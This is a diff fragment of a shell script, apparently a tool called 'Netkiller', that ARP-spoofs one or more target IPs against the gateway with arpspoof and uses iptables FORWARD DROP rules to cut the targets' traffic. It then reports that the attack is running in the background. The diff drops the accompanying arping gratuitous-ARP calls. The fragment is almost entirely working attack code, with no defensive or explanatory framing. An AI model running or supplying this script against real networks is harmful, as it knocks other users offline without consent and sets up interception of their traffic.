@@ -110,22 +110,14 @@ for TARGET in $TARGET_IPS; do
                 # Block all the traffic except the device ip and gateway (bidirectional)
                 iptables -I FORWARD ! -s "$MYIP" -d "$GATEWAY" -j DROP
                 iptables -I FORWARD -s "$GATEWAY" ! -d "$MYIP" -j DROP
-                (
-                    arpspoof -i "$INTERFACE" -t "$TARGET_IP" -r "$GATEWAY" >/dev/null 2>&1 &
-                    arping -b -A -i "$INTERFACE" -S "$TARGET_IP" "$GATEWAY" >/dev/null 2>&1 &
-                ) &
+                ( arpspoof -i "$INTERFACE" -t "$TARGET_IP" -r "$GATEWAY" >/dev/null 2>&1 ) &
             done
         fi
     else
         # Blocking traffic for Single IP
         iptables -I FORWARD ! -s "$TARGET" -d "$GATEWAY" -j DROP
         iptables -I FORWARD -s "$GATEWAY" ! -d "$TARGET" -j DROP
-
-        # Bidirectional Arp Spoofing policy
-        (   
-            arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 &
-            arping -b -A -i "$INTERFACE" -S "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
-        ) &
+      ( arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
     fi
 done
 echo "Netkiller Attack is running in the background..."
